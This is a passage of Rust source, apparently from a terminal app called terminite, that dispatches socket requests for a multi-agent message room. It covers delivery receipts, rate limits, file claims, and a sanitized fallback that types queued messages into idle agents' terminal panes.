//! Proto (Unix socket) request handling — verb dispatch and handlers.

use super::*;

/// Cap on un-consumed directed messages held per actor for catch-up. Bounds
/// memory if a receiver never acks (system-impact); oldest are dropped first.
const PENDING_CAP: usize = 64;

/// Loop-guard window + cap: at most `DELIVERY_MAX` pushes to one actor per
/// `DELIVERY_WINDOW_MS`. Over-cap deliveries defer (stay pending), so two idle
/// agents bouncing replies run at a bounded rate instead of a runaway.
const DELIVERY_WINDOW_MS: u64 = 10_000;
const DELIVERY_MAX: usize = 8;

/// Stall watch: if a delivered-to actor produces no activity within this, the
/// base re-delivers — up to `MAX_REDELIVERY` times, then gives up. Recovers a
/// stalled turn (a 529, a weaker model freezing) without a smart peer noticing.
const STALL_DEADLINE: std::time::Duration = std::time::Duration::from_secs(30);
const MAX_REDELIVERY: u8 = 3;

/// Cap on tracked per-message delivery states (oldest message ids evicted —
/// ids are monotonic, so the smallest is the oldest). A receipt for a very old
/// message ages out; the live ones are what a sender queries.
const MESSAGE_STATE_CAP: usize = 4096;

/// Cap on waiters queued per file (bounds memory; oldest dropped).
const FILE_WAITERS_CAP: usize = 16;

/// PTY floor: an actor silent this long is treated as idle (at its prompt), so a
/// held room message can be typed into its pane. Coarse cross-vendor proxy.
const PTY_IDLE: std::time::Duration = std::time::Duration::from_secs(5);
/// How recently the human must have typed in a pane for it to count as "in use"
/// (so the floor holds). Watching without typing past this lets a wake land.
const HUMAN_TYPING_WINDOW: std::time::Duration = std::time::Duration::from_secs(3);
/// A declared status older than this is treated as stale (fall back to the
/// silence heuristic) — so a forgotten `busy` can't block delivery forever.
const STATUS_TTL: std::time::Duration = std::time::Duration::from_secs(20 * 60);
/// The fast lane is sticky but not forever — a forgotten `auto` lapses back to
/// the safe default after this. Generous, since an orchestration session is long.
const AUTO_TTL: std::time::Duration = std::time::Duration::from_secs(60 * 60);

/// Max bytes for a room actor / target identifier. Bounds the key size of
/// every actor-keyed map (pending, delivery_log, status, claim waiters) so a
/// single request can't carry a huge string into a long-lived map. This
/// bounds the KEY only; binding an actor to its connection (so you can't act
/// as someone else) is the separate C-01 redesign.
pub(super) const MAX_ACTOR_LEN: usize = 64;

/// A syntactically valid actor/target id: non-empty, bounded, printable, and
/// whitespace-free (room slugs are single tokens like `claude-blue`/`pane:1`).
pub(super) fn valid_actor(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= MAX_ACTOR_LEN
        && s.chars().all(|c| !c.is_control() && !c.is_whitespace())
}

/// A short, single-line preview of message text for the outbox — trimmed and
/// capped so the receipt list stays glanceable without re-fetching full text.
pub(super) fn preview_text(text: &str) -> String {
    let t = text.split_whitespace().collect::<Vec<_>>().join(" ");
    if t.chars().count() > 80 {
        format!("{}…", t.chars().take(79).collect::<String>())
    } else {
        t
    }
}

/// Sanitize text bound for the PTY floor (C-01 Tier 1). The floor types a room
/// message into a pane and then auto-presses Enter, so a message must NEVER
/// carry control bytes — otherwise ESC sequences or C0/C1 controls (Ctrl-U to
/// clear the line, etc.) could turn a delivered "message" into a command. Every
/// control char (incl. \n \r \t ESC, DEL, C1) becomes a space; all printable +
/// Unicode message text passes through unchanged.
pub(super) fn sanitize_floor_text(text: &str) -> String {
    text.chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect()
}

impl Renderer {
    /// A new connection arrived. A connection is not a subscription —
    /// the subscriber slot is only set when someone calls `subscribe`,
    /// so we leave any existing subscriber alone here.
    pub fn handle_proto_connect(&mut self) {}

    /// A proto connection closed — clear the subscriber slot only if this
    /// connection owned it, and drop the connection's room presence (if it
    /// had joined). `room_who` reflects the departure immediately.
    pub fn handle_proto_disconnect(&mut self, conn_id: u64) {
        if matches!(&self.proto_subscriber, Some((cid, _)) if *cid == conn_id) {
            self.proto_subscriber = None;
        }
        // Drop any comms-base receiver this connection was holding.
        self.room_subscribers.retain(|_, (cid, _)| *cid != conn_id);
        if self.roster.leave(conn_id, crate::presence::now_ms()).is_some() {
            self.window.request_redraw();
        }
    }

    /// Handle one parsed request from the proto socket. `conn_id` identifies
    /// the connection — used by `room_join` to bind presence to it.
    pub fn handle_proto_request(
        &mut self,
        conn_id: u64,
        peer_pid: Option<i32>,
        req: crate::proto::Request,
        out: std::sync::mpsc::SyncSender<crate::proto::OutMessage>,
    ) {
        let payload = match req.method.as_str() {
            "list_tabs" => self.proto_list_tabs(),
            "list_blocks" => self.proto_list_blocks(&req.params),
            "get_block" => self.proto_get_block(&req.params),
            "subscribe" => {
                self.proto_subscriber = Some((conn_id, out.clone()));
                crate::proto::OutPayload::Subscribed
            }
            "set_tag" => self.proto_set_tag(&req.params),
            "remove_tag" => self.proto_remove_tag(&req.params),
            "cursor_at" => self.proto_cursor_at(&req.params),
            "cursor_clear" => self.proto_cursor_clear(&req.params),
            "export_tab" => self.proto_export_tab(&req.params),
            "stats" => self.proto_stats(),
            "list_modules" => crate::proto::OutPayload::Modules {
                modules: self.modules.list().to_vec(),
            },
            "reload_modules" => {
                self.reload_modules();
                crate::proto::OutPayload::Modules {
                    modules: self.modules.list().to_vec(),
                }
            }
            "activities_list" => self.proto_activities_list(&req.params),
            "activity_emit" => self.proto_activity_emit(&req.params),
            "room_message_status" => self.proto_message_status(&req.params),
            "room_outbox" => self.proto_outbox(&req.params),
            "room_message_cancel" => self.proto_message_cancel(&req.params),
            "room_join" => self.proto_room_join(conn_id, peer_pid, &req.params),
            "room_who" => self.proto_room_who(),
            "tool_emit" => self.proto_tool_emit(peer_pid, &req.params),
            "file_claim" => self.proto_file_claim(&req.params),
            "file_release" => self.proto_file_release(&req.params),
            "file_status" => self.proto_file_status(&req.params),
            "files" => self.proto_files(),
            "room_subscribe" => {
                // The comms base: park this connection as the push target for an
                // actor's directed messages. The receiver holds it open.
                let actor = req.params.get("actor").and_then(|v| v.as_str()).unwrap_or("");
                if !valid_actor(actor) {
                    crate::proto::OutPayload::Error {
                        message: "room_subscribe: missing or invalid actor".into(),
                    }
                } else {
                    self.room_subscribers
                        .insert(actor.to_string(), (conn_id, out.clone()));
                    // Catch-up: deliver anything that arrived while it was away.
                    self.deliver_pending(actor);
                    crate::proto::OutPayload::Subscribed
                }
            }
            // Receiver confirms it surfaced a pushed message → mark it CONSUMED
            // (drop from its addressee's pending queue, so it isn't re-delivered).
            "room_ack" => {
                if let Some(id) = req.params.get("message_id").and_then(|v| v.as_u64()) {
                    // The receiver processed it → the sender's receipt is `read`.
                    self.set_msg_state(id, crate::proto::MsgState::Read);
                    if let Some(actor) = self
                        .activities
                        .get(id)
                        .and_then(|a| a.message_to())
                        .map(String::from)
                    {
                        if let Some(q) = self.pending.get_mut(&actor) {
                            q.retain(|x| *x != id);
                        }
                        // Don't leave a drained queue's key lingering.
                        if self.pending.get(&actor).is_some_and(|q| q.is_empty()) {
                            self.pending.remove(&actor);
                        }
                    }
                }
                crate::proto::OutPayload::Ok
            }
            // An actor declares its own interruption readiness: `busy` (in a
            // long process — the floor must NOT inject) or `available` (at my
            // prompt — safe to deliver now). The precise signal only the agent
            // has; the floor respects it over the silence guess. Any other
            // value clears the declaration (back to the heuristic).
            "room_status" => {
                let actor = req.params.get("actor").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let state = req.params.get("state").and_then(|v| v.as_str()).unwrap_or("");
                if !valid_actor(&actor) {
                    crate::proto::OutPayload::Error {
                        message: "room_status: missing or invalid actor".into(),
                    }
                } else {
                    let now = std::time::Instant::now();
                    match state {
                        // Momentary brake — hold every wake path until cleared.
                        "busy" => {
                            self.actor_status.insert(actor.clone(), ("busy".into(), now));
                        }
                        // At the prompt / brake off → flush what was held down a
                        // native receiver (channel/WS); PTY-paned actors catch up
                        // on the next floor tick.
                        "available" => {
                            self.actor_status.insert(actor.clone(), ("available".into(), now));
                            self.deliver_pending(&actor);
                        }
                        // Enter the fast lane: standing consent to be driven. Drop
                        // any brake and flush — the floor now delivers promptly,
                        // not only when idle. The agent accepts the auto contract.
                        "auto" => {
                            self.actor_auto.insert(actor.clone(), now);
                            self.actor_status.remove(&actor);
                            self.deliver_pending(&actor);
                        }
                        // "normal" / anything else → leave the lane, clear the
                        // brake, back to the safe default (deliver only when idle).
                        _ => {
                            self.actor_auto.remove(&actor);
                            self.actor_status.remove(&actor);
                        }
                    }
                    crate::proto::OutPayload::Ok
                }
            }
            other => crate::proto::OutPayload::Error {
                message: format!("unknown method: {other}"),
            },
        };
        let _ = out.try_send(crate::proto::OutMessage { id: req.id, payload });
    }

    /// Read the room's activity stream, with optional `actor` / `to` /
    /// `kind` filters. `to: <slug>` returns only messages directed at that
    /// slug (broadcasts excluded) — an agent's inbox.
    pub(super) fn proto_activities_list(
        &self,
        params: &serde_json::Value,
    ) -> crate::proto::OutPayload {
        let actor = params.get("actor").and_then(|v| v.as_str());
        let to = params.get("to").and_then(|v| v.as_str());
        let kind = params.get("kind").and_then(|v| v.as_str());
        let activities = self
            .activities
            .list(actor, to, kind)
            .into_iter()
            .map(activity_to_info)
            .collect();
        crate::proto::OutPayload::Activities { activities }
    }

    /// Record an agent message. `actor` is host-supplied (the MCP server's
    /// `TERMINITE_ACTOR`), never self-declared. Lounge OFF here: this only
    /// records — routing/delivery is the router step. Only `agent_message`
    /// is accepted, which keeps the decision-kind question closed.
    pub(super) fn proto_activity_emit(
        &mut self,
        params: &serde_json::Value,
    ) -> crate::proto::OutPayload {
        let actor = params.get("actor").and_then(|v| v.as_str()).unwrap_or("");
        if actor.is_empty() {
            return crate::proto::OutPayload::Error {
                message: "activity_emit: missing actor — only a hosted agent with a room slug can emit".into(),
            };
        }
        if !valid_actor(actor) {
            return crate::proto::OutPayload::Error {
                message: format!("activity_emit: invalid actor (≤{MAX_ACTOR_LEN} bytes, no control/whitespace)"),
            };
        }
        if let Some(to) = params.get("to").and_then(|v| v.as_str()) {
            if !valid_actor(to) {
                return crate::proto::OutPayload::Error {
                    message: format!("activity_emit: invalid 'to' (≤{MAX_ACTOR_LEN} bytes, no control/whitespace)"),
                };
            }
        }
        let kind = params.get("kind").and_then(|v| v.as_str()).unwrap_or("");
        if kind != "agent_message" {
            return crate::proto::OutPayload::Error {
                message: format!("activity_emit: unsupported kind {kind:?} (only agent_message)"),
            };
        }
        let text = params
            .get("text")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        if text.trim().is_empty() {
            return crate::proto::OutPayload::Error {
                message: "activity_emit: empty text".into(),
            };
        }
        let to = params.get("to").and_then(|v| v.as_str());
        let id = self.emit_directed(actor, to, &text);
        crate::proto::OutPayload::Emitted { message_id: id }
    }

    /// Record a directed (or broadcast, `to: None`) message and DELIVER it:
    /// queue as pending for catch-up, then push to a live receiver. Shared by
    /// the `activity_emit` verb and terminite's own system notifications (e.g.
    /// "file free"). The emitter is marked awake (its stall watch clears).
    /// Returns the activity id.
    /// Record a message's delivery fate (R1's receipt), bounded — evict the
    /// oldest (smallest) id when over cap. `Read`/`Cancelled`/`GaveUp` are
    /// terminal; never regress a terminal state to an in-flight one.
    fn set_msg_state(&mut self, id: u64, state: crate::proto::MsgState) {
        use crate::proto::MsgState::*;
        if let Some(cur) = self.message_state.get(&id) {
            // Read and Cancelled are final. GaveUp is NOT — the channel
            // re-delivery gave up, but the PTY floor may still land it later.
            if matches!(cur, Read | Cancelled) {
                return;
            }
        }
        if self.message_state.len() >= MESSAGE_STATE_CAP
            && !self.message_state.contains_key(&id)
        {
            if let Some(&oldest) = self.message_state.keys().min() {
                self.message_state.remove(&oldest);
            }
        }
        self.message_state.insert(id, state);
    }

    /// The actor just produced activity → any message we'd delivered to it
    /// that's still awaiting confirmation was, by evidence, processed. Mark it
    /// `read` (R1's "processed" receipt) by INFERENCE — the recipient woke and
    /// acted after the delivery — so the sender gets a true receipt without the
    /// agent needing to ack. This is the only path to `read` for a floor-typed
    /// message (it arrives as pane text with no id to ack), and the
    /// weakest-resident-correct one: the base infers progress, the agent needn't
    /// be clever. `read` therefore means "acked OR active-after-delivery".
    fn mark_processed(&mut self, actor: &str) {
        use crate::proto::MsgState;
        let ids: Vec<u64> = self
            .message_state
            .iter()
            .filter(|&(_, &s)| matches!(s, MsgState::Delivered | MsgState::FloorTyped))
            .filter_map(|(&id, _)| {
                let a = self.activities.get(id)?;
                (a.message_to() == Some(actor)).then_some(id)
            })
            .collect();
        for id in ids {
            self.set_msg_state(id, MsgState::Read);
        }
    }

    fn emit_directed(&mut self, from: &str, to: Option<&str>, text: &str) -> u64 {
        let agent_name = agent_name_from_slug(from);
        let id = self.activities.emit_message(
            from.to_string(),
            agent_name,
            to.map(String::from),
            text.to_string(),
        );
        if to.is_some() {
            self.set_msg_state(id, crate::proto::MsgState::Queued);
        }
        // The emitter just acted → it's awake; clear any stall watch on it,
        // stamp its activity (so the PTY floor knows it's not idle right now),
        // and mark anything we'd delivered to it as processed (R1 receipt).
        self.delivery_watch.remove(from);
        self.last_activity.insert(from.to_string(), std::time::Instant::now());
        self.mark_processed(from);
        if let Some(target) = to {
            let q = self.pending.entry(target.to_string()).or_default();
            q.push(id);
            if q.len() > PENDING_CAP {
                let excess = q.len() - PENDING_CAP;
                q.drain(0..excess);
            }
            self.push_room_message(target, id, from, text);
        }
        id
    }

    /// Re-deliver every un-consumed directed message for `actor` — catch-up when
    /// a receiver subscribes (so a message sent while the agent was away still
    /// arrives). Collect first (immutable borrow), then push.
    fn deliver_pending(&mut self, actor: &str) {
        let msgs: Vec<(u64, String, String)> = self
            .pending
            .get(actor)
            .map(|ids| {
                ids.iter()
                    .filter_map(|&id| {
                        let a = self.activities.get(id)?;
                        Some((id, a.actor.clone(), a.message_text()?.to_string()))
                    })
                    .collect()
            })
            .unwrap_or_default();
        for (id, from, text) in msgs {
            self.push_room_message(actor, id, &from, &text);
        }
    }

    /// Push a directed message down a subscribed actor's receiver connection.
    /// A dead writer (receiver gone) is dropped. This is the delivery half of
    /// the comms base.
    fn push_room_message(&mut self, target: &str, message_id: u64, from: &str, text: &str) {
        // The human's opt-out: delivery off → record-only (the message still
        // queued as pending, so toggling back on catches up). The single choke
        // point for both direct push and catch-up.
        if !self.config.comms_delivery {
            return;
        }
        // The actor declared itself heads-down: hold every wake path, not just
        // the PTY floor. A `busy` claude/codex receiver gets nothing pushed; the
        // message waits in pending and flushes when it goes `available`. The
        // status gate is uniform across receivers — the base obeys the
        // declaration whoever the resident is.
        if self.declared_status(target) == Some("busy") {
            return;
        }
        // Loop-guard: prune the actor's delivery window, and if it's already at
        // the cap, DON'T push — the message stays pending and catches up once the
        // rate cools. Breaks a two-agent bounce from running unbounded.
        let now = crate::presence::now_ms();
        let log = self.delivery_log.entry(target.to_string()).or_default();
        while log.front().is_some_and(|&t| now.saturating_sub(t) >= DELIVERY_WINDOW_MS) {
            log.pop_front();
        }
        if log.len() >= DELIVERY_MAX {
            return;
        }
        log.push_back(now);
        let send_failed = match self.room_subscribers.get(target) {
            Some((_, out)) => out
                .try_send(crate::proto::OutMessage {
                    id: 0,
                    payload: crate::proto::OutPayload::RoomMessage {
                        message_id,
                        from: from.to_string(),
                        text: text.to_string(),
                    },
                })
                .is_err(),
            // No live receiver: the message waits in pending (no delivery
            // happened) — nothing to stall-watch, it isn't stuck, just unread.
            None => return,
        };
        if send_failed {
            self.room_subscribers.remove(target);
            return;
        }
        self.set_msg_state(message_id, crate::proto::MsgState::Delivered);
        // Delivered to a live receiver → arm the stall watch (preserving the
        // retry count). If the actor stays silent past STALL_DEADLINE, the base
        // re-delivers — progress doesn't depend on the agent being clever.
        let retries = self.delivery_watch.get(target).map(|(_, r)| *r).unwrap_or(0);
        self.delivery_watch.insert(
            target.to_string(),
            (std::time::Instant::now() + STALL_DEADLINE, retries),
        );
    }

    /// Re-deliver to any actor that went silent past its stall deadline (up to
    /// `MAX_REDELIVERY`), else give up. Called from the main loop's
    /// `about_to_wait` — the base owning progress is what makes the room robust
    /// for weaker residents, instead of relying on a smart peer to re-poke.
    pub fn check_stalls(&mut self) {
        if self.delivery_watch.is_empty() {
            return;
        }
        let now = std::time::Instant::now();
        let due: Vec<String> = self
            .delivery_watch
            .iter()
            .filter(|(_, (deadline, _))| now >= *deadline)
            .map(|(a, _)| a.clone())
            .collect();
        for actor in due {
            let retries = self.delivery_watch.get(&actor).map(|(_, r)| *r).unwrap_or(0);
            let has_pending = self.pending.get(&actor).is_some_and(|q| !q.is_empty());
            if retries >= MAX_REDELIVERY && has_pending {
                // Channel re-delivery exhausted — mark each still-pending
                // message `gave_up` so its SENDER sees that, not eternal
                // silence. (The PTY floor may still land it; that's a forward
                // transition GaveUp permits.)
                if let Some(ids) = self.pending.get(&actor).cloned() {
                    for id in ids {
                        self.set_msg_state(id, crate::proto::MsgState::GaveUp);
                    }
                }
                self.delivery_watch.remove(&actor);
                continue;
            }
            if !has_pending {
                self.delivery_watch.remove(&actor); // acted / nothing left
                continue;
            }
            // Bump the retry, then re-deliver (push re-arms the watch with it).
            self.delivery_watch
                .insert(actor.clone(), (now + STALL_DEADLINE, retries + 1));
            self.deliver_pending(&actor);
        }
    }

    // ── PTY floor — the universal receiver ──────────────────────────────────
    // The fallback when an actor has no native receiver: type a held room
    // message into its pane, but only when the human isn't there (window
    // unfocused or a different tab) and the actor is idle (at its prompt). Per
    // the residents' decision: the base bounds the
    // crudeness; identity stays in the pane.

    /// Silent past `PTY_IDLE` ⇒ treated as idle (at its prompt). No record ⇒
    /// never active ⇒ idle.
    fn is_actor_idle(&self, slug: &str) -> bool {
        match self.last_activity.get(slug) {
            Some(t) => std::time::Instant::now().duration_since(*t) > PTY_IDLE,
            None => true,
        }
    }

    /// The actor's own fresh declaration, if any: `Some("busy")`,
    /// `Some("available")`, or `None` (never declared / stale past `STATUS_TTL`).
    /// This is the precise signal the silence heuristic only approximates.
    fn declared_status(&self, slug: &str) -> Option<&str> {
        let (state, set) = self.actor_status.get(slug)?;
        (std::time::Instant::now().duration_since(*set) < STATUS_TTL).then_some(state.as_str())
    }

    /// In the fast lane — standing consent to be driven, fresh within `AUTO_TTL`.
    fn is_auto(&self, slug: &str) -> bool {
        self.actor_auto
            .get(slug)
            .is_some_and(|t| std::time::Instant::now().duration_since(*t) < AUTO_TTL)
    }

    /// Is it safe to type a wake into this actor's pane right now? `busy` holds
    /// it (the brake wins in every lane); `available` green-lights it; otherwise
    /// the fast lane (auto) OR the silence heuristic opens the gate.
    fn pty_ready(&self, slug: &str) -> bool {
        match self.declared_status(slug) {
            Some("busy") => false,
            Some("available") => true,
            _ => self.is_auto(slug) || self.is_actor_idle(slug),
        }
    }

    /// What to surface in `room_who`: the brake is most urgent to see, then the
    /// fast lane, then a transient `available`.
    fn shown_status(&self, slug: &str) -> Option<String> {
        match self.declared_status(slug) {
            Some("busy") => Some("busy".into()),
            other => {
                if self.is_auto(slug) {
                    Some("auto".into())
                } else {
                    other.map(String::from)
                }
            }
        }
    }

    /// The human is *actively typing* in this pane — never inject there (we'd
    /// stomp their keystrokes). Only the focused active tab can qualify, and only
    /// if it's seen human input within `HUMAN_TYPING_WINDOW`. Watching a focused
    /// pane without typing does NOT block injection — so you can sit and watch a
    /// wake land on the very pane you're looking at.
    fn human_at_pane(&self, pane: u64) -> bool {
        if !(self.focused && self.active_tab_ref().id.0 == pane) {
            return false;
        }
        match self.last_human_input.get(&pane) {
            Some(t) => std::time::Instant::now().duration_since(*t) < HUMAN_TYPING_WINDOW,
            None => false,
        }
    }

    /// Write raw bytes into a pane's terminal by id. The low-level half of the
    /// floor — used to type the text and, separately, to send the Enter.
    fn pty_write_raw(&self, pane: u64, bytes: Vec<u8>) {
        let Some(root) = self.root.as_ref() else { return };
        let mut tabs: Vec<&Tab> = Vec::new();
        root.all_tabs(&mut tabs);
        if let Some(tab) = tabs.into_iter().find(|t| t.id.0 == pane) {
            tab.live_term.write(bytes);
        }
    }

    /// Type `text` (collapsed to one line) into the pane, then queue its Enter a
    /// beat later. The split is the fix for the relay's "submit gap": a fast
    /// text+`\r` burst reads as a paste and the newline never submits; a delayed,
    /// isolated Enter does. See `PTY_SUBMIT_DELAY` / `flush_pty_submits`.
    fn pty_inject(&mut self, pane: u64, text: &str, msg_ids: Vec<u64>) {
        let line = sanitize_floor_text(text);
        let typed_chars = line.chars().count();
        self.pty_write_raw(pane, line.into_bytes());
        self.pty_submit_queue.push(super::FloorSubmit {
            deadline: std::time::Instant::now() + PTY_SUBMIT_DELAY,
            pane,
            typed_chars,
            msg_ids,
        });
        // Host-side diagnostic (the agents can't see the PTY buffer): proves the
        // floor typed text to a pane, and that the Enter is coming separately.
        eprintln!(
            "[pty-floor] typed {typed_chars} chars → pane {pane}; Enter in {}ms",
            PTY_SUBMIT_DELAY.as_millis()
        );
    }

    /// Send the deferred Enter for any floor injection whose delay has elapsed.
    /// Called from `about_to_wait`; scheduled via `next_wakeup`. Cheap no-op
    /// when the queue is empty.
    pub fn flush_pty_submits(&mut self) {
        if self.pty_submit_queue.is_empty() {
            return;
        }
        let now = std::time::Instant::now();
        let mut still_waiting = Vec::new();
        for s in std::mem::take(&mut self.pty_submit_queue) {
            if s.deadline <= now {
                self.pty_write_raw(s.pane, b"\r".to_vec());
                eprintln!("[pty-floor] Enter → pane {}", s.pane);
            } else {
                still_waiting.push(s);
            }
        }
        self.pty_submit_queue = still_waiting;
    }

    /// Any pending message bound for a paned actor with no native receiver?
    /// Drives the retry tick in `next_wakeup` (only ticks while one waits).
    pub fn has_pending_pty_work(&self) -> bool {
        self.pending.iter().any(|(actor, ids)| {
            !ids.is_empty()
                && !self.room_subscribers.contains_key(actor)
                && self.roster.pane_for_slug(actor).is_some()
        })
    }

    /// PTY-floor delivery pass (called from `about_to_wait`): for each pending
    /// message to a paned actor with no native receiver, if the human isn't in
    /// that pane and the actor is idle, type it in and mark it consumed. Held
    /// otherwise — the message waits in `pending` until the gate opens.
    pub fn try_pty_deliveries(&mut self) {
        if self.pending.is_empty() || !self.config.comms_delivery {
            return;
        }
        let mut jobs: Vec<(String, u64, Vec<u64>, Vec<(String, String)>)> = Vec::new();
        for (actor, ids) in &self.pending {
            if ids.is_empty() || self.room_subscribers.contains_key(actor) {
                continue;
            }
            let Some(pane) = self.roster.pane_for_slug(actor) else { continue };
            if self.human_at_pane(pane) || !self.pty_ready(actor) {
                continue;
            }
            let mut id_list = Vec::new();
            let msgs: Vec<(String, String)> = ids
                .iter()
                .filter_map(|&id| {
                    let a = self.activities.get(id)?;
                    let m = (a.actor.clone(), a.message_text()?.to_string());
                    id_list.push(id);
                    Some(m)
                })
                .collect();
            if !msgs.is_empty() {
                jobs.push((actor.clone(), pane, id_list, msgs));
            }
        }
        for (actor, pane, ids, msgs) in jobs {
            // One injection per actor (one Enter = one turn) — concatenate any
            // held messages so a backlog doesn't fire N separate turns.
            let combined = msgs
                .iter()
                .map(|(from, text)| format!("[{from}] {text}"))
                .collect::<Vec<_>>()
                .join("  ·  ");
            for &id in &ids {
                self.set_msg_state(id, crate::proto::MsgState::FloorTyped);
            }
            self.pty_inject(pane, &format!("[terminite room] {combined}"), ids);
            // Typed in → consumed: drop the queue + any stall watch.
            self.pending.remove(&actor);
            self.delivery_watch.remove(&actor);
        }
    }

    /// `room_message_status {message_id}` — the delivery fate of one directed
    /// message (R1's receipt): queued / delivered / floor_typed / read /
    /// cancelled / gave_up. So a sender knows whether it was *processed*.
    pub(super) fn proto_message_status(
        &self,
        params: &serde_json::Value,
    ) -> crate::proto::OutPayload {
        let Some(id) = params.get("message_id").and_then(|v| v.as_u64()) else {
            return crate::proto::OutPayload::Error {
                message: "message_status: needs a message_id".into(),
            };
        };
        let Some(&state) = self.message_state.get(&id) else {
            return crate::proto::OutPayload::Error {
                message: "message_status: unknown message id (not a tracked directed message, or aged out)".into(),
            };
        };
        let (from, to) = self
            .activities
            .get(id)
            .map(|a| (a.actor.clone(), a.message_to().map(String::from)))
            .unwrap_or_default();
        crate::proto::OutPayload::MessageStatus {
            message_id: id,
            state,
            from,
            to,
        }
    }

    /// `room_outbox {actor}` — every directed message this actor sent that the
    /// room still tracks, with each one's state and a short preview. The
    /// glanceable receipt: "what happened to everything I said."
    pub(super) fn proto_outbox(
        &self,
        params: &serde_json::Value,
    ) -> crate::proto::OutPayload {
        let actor = params.get("actor").and_then(|v| v.as_str()).unwrap_or("");
        if !valid_actor(actor) {
            return crate::proto::OutPayload::Error {
                message: "outbox: missing or invalid actor".into(),
            };
        }
        let mut messages: Vec<crate::proto::OutboxEntry> = self
            .message_state
            .iter()
            .filter_map(|(&id, &state)| {
                let a = self.activities.get(id)?;
                if a.actor != actor {
                    return None;
                }
                let preview = a.message_text().map(preview_text).unwrap_or_default();
                Some(crate::proto::OutboxEntry {
                    message_id: id,
                    to: a.message_to().map(String::from),
                    state,
                    preview,
                })
            })
            .collect();
        messages.sort_by_key(|m| m.message_id);
        crate::proto::OutPayload::Outbox { messages }
    }

    /// `room_message_cancel {message_id, actor}` — sender-scoped. Retract a
    /// still-queued message (pull it from the recipient's pending so it never
    /// lands), or *unsend* one the floor just typed but hasn't submitted yet
    /// (erase the line + drop its Enter). Too late once it's delivered / read.
    pub(super) fn proto_message_cancel(
        &mut self,
        params: &serde_json::Value,
    ) -> crate::proto::OutPayload {
        use crate::proto::MsgState;
        let Some(id) = params.get("message_id").and_then(|v| v.as_u64()) else {
            return crate::proto::OutPayload::Error {
                message: "message_cancel: needs a message_id".into(),
            };
        };
        let actor = params.get("actor").and_then(|v| v.as_str()).unwrap_or("");
        // Resolve sender + addressee, then drop the borrow before mutating.
        let Some((from, to)) = self
            .activities
            .get(id)
            .map(|a| (a.actor.clone(), a.message_to().map(String::from)))
        else {
            return crate::proto::OutPayload::Error {
                message: "message_cancel: unknown message id".into(),
            };
        };
        if !actor.is_empty() && actor != from {
            return crate::proto::OutPayload::Error {
                message: "message_cancel: only the sender can cancel its own message".into(),
            };
        }
        match self.message_state.get(&id).copied() {
            Some(MsgState::Queued) => {
                if let Some(target) = &to {
                    if let Some(q) = self.pending.get_mut(target) {
                        q.retain(|x| *x != id);
                        if q.is_empty() {
                            self.pending.remove(target);
                        }
                    }
                }
                self.set_msg_state(id, MsgState::Cancelled);
                crate::proto::OutPayload::MessageCancel {
                    message_id: id,
                    cancelled: true,
                    state: MsgState::Cancelled,
                }
            }
            Some(MsgState::FloorTyped) if self.unsend_floor(id) => {
                crate::proto::OutPayload::MessageCancel {
                    message_id: id,
                    cancelled: true,
                    state: MsgState::Cancelled,
                }
            }
            Some(other) => crate::proto::OutPayload::MessageCancel {
                message_id: id,
                cancelled: false,
                state: other,
            },
            None => crate::proto::OutPayload::Error {
                message: "message_cancel: untracked message id".into(),
            },
        }
    }

    /// If a floor injection covering `id` is still waiting on its delayed Enter,
    /// erase the typed line (one backspace per typed char — the prompt was idle
    /// when injected) and drop the Enter, so the stale message never submits.
    /// Cancels the whole injection (its messages were typed as one line — a
    /// batch can't be surgically un-typed). Returns false if the Enter already
    /// fired (too late).
    fn unsend_floor(&mut self, id: u64) -> bool {
        let Some(pos) = self
            .pty_submit_queue
            .iter()
            .position(|s| s.msg_ids.contains(&id))
        else {
            return false;
        };
        let s = self.pty_submit_queue.remove(pos);
        self.pty_write_raw(s.pane, vec![0x7f; s.typed_chars]); // backspace ×N
        eprintln!("[pty-floor] unsend → erased {} chars in pane {}", s.typed_chars, s.pane);
        for mid in s.msg_ids {
            self.set_msg_state(mid, crate::proto::MsgState::Cancelled);
        }
        true
    }

    /// `file_claim {actor, path}` — an actor declares it's working in a file.
    /// Advisory: the claim always succeeds (the human always wins), but if a
    /// *different* live actor already held it, that actor is returned as
    /// `conflict` so the caller learns "someone is already in here" and can
    /// yield. `actor` is host-supplied by the MCP server, never self-declared.
    pub(super) fn proto_file_claim(
        &mut self,
        params: &serde_json::Value,
    ) -> crate::proto::OutPayload {
        let actor = params.get("actor").and_then(|v| v.as_str()).unwrap_or("");
        let path = params.get("path").and_then(|v| v.as_str()).unwrap_or("");
        if actor.is_empty() || path.is_empty() {
            return crate::proto::OutPayload::Error {
                message: "file_claim: needs a room actor and a path".into(),
            };
        }
        let conflict = self
            .file_claims
            .claim(actor, path, crate::presence::now_ms())
            .map(|c| c.slug);
        if conflict.is_some() {
            // Refused (first-come held it) → queue the caller as a waiter. The
            // instant the holder releases, terminite pushes it a "file free"
            // message (the salt set down) — no polling.
            let waiters = self.file_waiters.entry(path.to_string()).or_default();
            if !waiters.iter().any(|w| w == actor) {
                waiters.push(actor.to_string());
                if waiters.len() > FILE_WAITERS_CAP {
                    waiters.remove(0);
                }
            }
        }
        crate::proto::OutPayload::FileClaim { path: path.to_string(), conflict }
    }

    /// Push a "file free" message to anyone waiting on a path that's now free
    /// (released, or its claim expired). The salt set down: the waiter is
    /// notified instead of polling. Called from the main loop's `about_to_wait`.
    /// Self-clearing (freed paths drop their waiter list) and bounded.
    pub fn notify_freed_waiters(&mut self) {
        if self.file_waiters.is_empty() {
            return;
        }
        let now = crate::presence::now_ms();
        let freed: Vec<(String, Vec<String>)> = self
            .file_waiters
            .iter()
            .filter(|(path, _)| self.file_claims.holder(path, now).is_none())
            .map(|(p, w)| (p.clone(), w.clone()))
            .collect();
        for (path, waiters) in freed {
            self.file_waiters.remove(&path);
            for w in waiters {
                self.emit_directed("terminite", Some(&w), &format!("file is now free: {path}"));
            }
        }
    }

    /// `file_release {actor, path}` — drop a claim the actor holds.
    pub(super) fn proto_file_release(
        &mut self,
        params: &serde_json::Value,
    ) -> crate::proto::OutPayload {
        let actor = params.get("actor").and_then(|v| v.as_str()).unwrap_or("");
        let path = params.get("path").and_then(|v| v.as_str()).unwrap_or("");
        self.file_claims.release(actor, path);
        crate::proto::OutPayload::Ok
    }

    /// `file_status {path}` — who, if anyone, currently holds a path.
    pub(super) fn proto_file_status(
        &self,
        params: &serde_json::Value,
